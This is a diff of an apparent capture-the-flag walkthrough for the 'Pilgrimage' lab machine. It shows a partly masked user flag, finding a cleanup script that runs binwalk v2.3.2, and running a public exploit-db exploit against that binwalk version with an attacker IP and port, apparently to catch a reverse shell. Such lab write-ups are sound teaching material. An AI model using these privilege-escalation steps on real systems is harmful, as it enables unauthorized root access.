@@ -223,6 +223,13 @@ permitted by applicable law.
 emily@pilgrimage:~$ 
 
 ```
+emily@pilgrimage:~$ cat user.txt 
+d0663dd014**********************
+```
+
+After running linpeas we find malwarescan.sh that looks suspicious.
+
+```
 emily@pilgrimage:/tmp$ cat  /usr/sbin/malwarescan.sh 
 #!/bin/bash
 
@@ -240,15 +247,22 @@ blacklist=("Executable script" "Microsoft executable")
 done
 ```
 
+Further anaylysis shows that it is executing binwalk and if we check binwalk we can find its version number that has an exploit for it.
+```
+emily@pilgrimage:/tmp$ binwalk -h
 
-emily@pilgrimage:~$ cat user.txt 
-d0663dd014**********************
+Binwalk v2.3.2
+Craig Heffner, ReFirmLabs
+https://github.com/ReFirmLabs/binwalk
+```
 
+Follow the directions and transfer the exploit to the victim.
 
 https://www.exploit-db.com/exploits/51249
 
+```
 emily@pilgrimage:/tmp$ python3 51249.py /var/www/pilgrimage.htb/shrunk/64a3308894bdb.png 10.10.14.130 555
-
+```
 
 After transferring any image, run the exploit
 
